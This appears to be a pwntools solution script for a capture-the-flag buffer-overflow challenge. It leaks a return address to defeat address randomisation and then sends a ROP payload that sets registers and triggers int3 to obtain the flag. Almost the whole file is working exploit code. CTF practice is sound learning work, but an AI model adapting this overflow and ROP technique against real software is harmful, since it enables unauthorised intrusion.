#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./bof')

if args.REMOTE:
	p = remote('maze.chal.perfect.blue', 1)
else:
	p = process(binary.path)

'''
// This is what you need to do to get the first flag
// void print_flag() {
//   asm volatile("mov $1, %%eax; mov $0x31337, %%edi; mov $0x1337, %%esi; int3" ::: "eax");
// }
'''

# 0x00001396: pop esi; pop edi; pop ebp; ret;
binary.symbols['pop_esi_edi_edp'] = 0x00001396

# ropper did not find this
'''
    13ad:       58                      pop    eax
    13ae:       cc                      int3
    13af:       c3                      ret
'''
binary.symbols['pop_eax_int3'] = 0x13ad

p.sendlineafter('Do you want color in the visualization? (Y/n) ', 'n')

for i in range(10):
	_ = p.recvline().strip().decode().split(' ')

return_addr = int(''.join(_[2:6][::-1]),16)
log.info('return_addr: ' + hex(return_addr))
binary.address = return_addr - ((return_addr & 0xFFF) - (binary.sym.main & 0xFFF)) - binary.sym.main
log.info('binary.address: ' + hex(binary.address))

payload  = b''
payload += (0x40 - 0x10) * b'A'
payload += b'flag'
payload += (0x40 - len(payload)) * b'A'
payload += p32(binary.sym.pop_esi_edi_edp)
payload += p32(0x1337)
payload += p32(0x31337)
payload += p32(0xdeadba5e)
payload += p32(binary.sym.pop_eax_int3)
payload += p32(1)

p.sendlineafter('Input some text: ', payload)
p.stream()
